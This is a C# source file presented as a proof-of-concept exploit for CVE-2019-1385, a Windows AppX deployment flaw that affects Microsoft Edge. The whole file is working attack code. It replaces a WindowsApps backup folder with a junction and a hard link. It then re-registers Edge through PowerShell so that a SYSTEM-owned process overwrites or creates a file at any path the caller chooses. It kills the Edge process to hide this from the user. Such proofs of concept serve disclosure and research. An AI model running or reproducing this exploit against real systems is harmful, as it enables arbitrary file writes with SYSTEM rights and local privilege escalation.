using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;
//CVE-2019-1385 POC
// my first attempt to write a c# console application :) I think I did a great job
namespace AppxExploit
{
    public class EdgeExploit
    {
        static void Main(string[] args)
        {
            try
            {
                string NTAuthoritySystem = @"NT AUTHORITY\SYSTEM";
                string appLocalData = Environment.GetFolderPath((Environment.SpecialFolder.LocalApplicationData));
                string WindowsAppsDir = $@"{appLocalData}\Microsoft\WindowsApps";
                string MSEdgePackageName = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
                string EdgeExeName = "MicrosoftEdge.exe";
                string MSEdgeExe1 = $@"{WindowsAppsDir}\{MSEdgePackageName}\{EdgeExeName}";
                //Just For Testing
                //string MSEdgeExe2 = $@"{WindowsAppsDir}\Backup\{EdgeExeName}";
                string MSEdgeBackupDir = $@"{WindowsAppsDir}\Backup";
                //string MSEdgeExe3 = $@"{WindowsAppsDir}\Backup\{MSEdgePackageName}\{EdgeExeName}";
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("# Author : Abdelhamid Naceri");
                Console.ResetColor();
                //Check Argument
                if (args != null && (args.Length != 1))
                {
                    Console.WriteLine("[+] Usage : program.exe [Path_OR_TargetFile]");
                    Console.WriteLine("If The Input Is A Directory This POC Will Create An Arbitrary File With Name 'MicrosoftEdge.exe' Otherwise If The Input Is A File This POC Will Overwrite The Content");
                    return;
                }
                //check if the given argument if valid
                if (!Directory.Exists(args[0]) && !File.Exists(args[0]))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Invalid Argument");
                    Console.ResetColor();
                    return;
                }
                try
                {
                    Directory.Delete(MSEdgeBackupDir, true);
                    Directory.Delete($@"{WindowsAppsDir}\{MSEdgePackageName}", true);
                    File.Delete($@"{WindowsAppsDir}\{EdgeExeName}");
                }
                catch (Exception z){}
                Directory.CreateDirectory(MSEdgeBackupDir);
                //there are 2 condition the first one ms-edge should be installed
                //the second one the owner of MSEdgeExe1 (check the var) <- should
                //be system
                Console.WriteLine("[!] Checking Conditions ...");
                Console.WriteLine(" [!] Checking Existance Of MS-Edge ...");
                if (!File.Exists(@"C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe"))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine(@" [!]Error Failed To Retrieve MS-Edge Executable at C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe");
                    Console.ResetColor();
                    return;
                }

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($" [+] Deploying MS-Edge To Check Ownership Of {MSEdgeExe1} ");
                Console.ResetColor();
                DeployMsEdge();
                string FileOwner = File.GetAccessControl($@"{MSEdgeExe1}").GetOwner(typeof(NTAccount)).ToString();
                Console.WriteLine($@" [!] Checking The Owner Of {MSEdgeExe1}");
                if (FileOwner != NTAuthoritySystem)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($@" [!] The Owner Of {MSEdgeExe1} => {FileOwner} Which Is Different From {NTAuthoritySystem}");
                    Console.WriteLine(" [!] May Be Patched");
                    Console.ResetColor();
                    return;
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($@" [!] The Owner Of {MSEdgeExe1} => {FileOwner}");
                Console.ResetColor();
                if (File.Exists(args[0]))
                {
                    Console.WriteLine("[+] The Given Argument Is A File ...");
                    Console.WriteLine("[+] Attempting To Overwrite File Content ...");
                    string temp = GenRandomTempFolder();
                    Console.WriteLine($"[+] TempDir Has Been Created {temp}");
                    Directory.Delete(MSEdgeBackupDir);
                    Thread.Sleep(500);
                    if (Directory.Exists(MSEdgeBackupDir))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Failed To Delete {MSEdgeBackupDir}");
                        Console.ResetColor();
                        return;
                    }
                    Console.WriteLine($"[+] Removed Directory {MSEdgeBackupDir}");
                    Console.WriteLine($@"[+] Creating junction {MSEdgeBackupDir} to {temp} ");
                    JunctionPoint.Create(MSEdgeBackupDir, temp, true);
                    Console.WriteLine($@"[+] Done - created junction from {MSEdgeBackupDir} to {temp} ");
                    bool created = HardLink.CreateNtHardLink($@"{temp}\{EdgeExeName}", args[0]);
                    if (!created)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($@"[!] CreateHardLink from {temp}\{EdgeExeName} to {args[0]} failed ");
                        Console.ResetColor();
                        return;
                    }
                    Console.WriteLine($@"[+] Created HardLink from {temp}\{EdgeExeName} <<<<=========>>>> {args[0]} ");
                    Console.WriteLine("[!] Deploying MS-Edge Again To Trigger The Bug ...");
                    DeployMsEdge();
                    Directory.Delete(MSEdgeBackupDir, false);
                    Console.WriteLine("[+] Check File Content Again");
                    return;
                }
                if (Directory.Exists(args[0]))
                {
                    Console.WriteLine("[+] The Given Argument Is A Directory");
                    Console.WriteLine("[+] Attempting To Create A New File With Name 'MicrosoftEdge.exe' ...");
                    Directory.Delete(MSEdgeBackupDir);
                    Thread.Sleep(500);
                    if (Directory.Exists(MSEdgeBackupDir))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] Failed To Delete {MSEdgeBackupDir}");
                        Console.ResetColor();
                        return;
                    }
                    Console.WriteLine($"[+] Removed Directory {MSEdgeBackupDir}");
                    Console.WriteLine($@"[+] Creating junction {MSEdgeBackupDir} to {args[0]} ");
                    JunctionPoint.Create(MSEdgeBackupDir, args[0], true);
                    Console.WriteLine($@"[+] Done - created junction from {MSEdgeBackupDir} to {args[0]} ");
                    Console.WriteLine("[!] Deploying MS-Edge Again To Trigger The Bug ...");
                    DeployMsEdge();
                    Directory.Delete(MSEdgeBackupDir, false);
                    Console.WriteLine("[+] Check Directory Content Again");
                    return;
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Something Went Wrong , Try Again :(");
                Console.WriteLine(e);
                return;
            }
        }
        public static string GenRandomTempFolder()
        {
            string Random = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            string appLocalData = Environment.GetFolderPath((Environment.SpecialFolder.ApplicationData));
            Random r = new Random();
            int rInt = r.Next(0, Random.Length);
            string sr = "appx-";
            string TempDir = $@"{appLocalData}\Local\Temp";
            do
            {
                for (int i = 0; i < 64; i++)
                {
                    rInt = r.Next(0, Random.Length);
                    sr += Random[rInt];
                }
                TempDir += sr;
                Directory.CreateDirectory(TempDir);
            } while (!Directory.Exists(TempDir));
            return TempDir;
        }
        private static void DeployMsEdge()
        {

            //here we can deploy ms-edge without starting it °-°
            Process process = new Process();
            process.StartInfo.FileName = $@"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
            process.StartInfo.Arguments = "/c Add-AppxPackage -RegisterByFamilyName -ForceApplicationShutdown -MainPackage Microsoft.MicrosoftEdge_8wekyb3d8bbwe";
            process.StartInfo.UseShellExecute = false;
            process.ErrorDataReceived += Process_DataReceived;
            process.OutputDataReceived += Process_DataReceived;
            process.Start();
            process.WaitForExit();/*wait the deployment process to end*/
            //sometime the deployment process start microsoft edge so we need
            //kill it to prevent user intervention
            KillProcessByName("MicrosoftEdge.exe");
            return;
        }
        private static void Process_DataReceived(object sender, DataReceivedEventArgs e)
        {
            Console.WriteLine($"[!] whoaaa ");
        }
        private static void KillProcessByName(string processName)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                if (p.ProcessName.ToLower().Contains(processName.ToLower()))
                {
                    p.Kill();
                }
            }
        }
    }
}
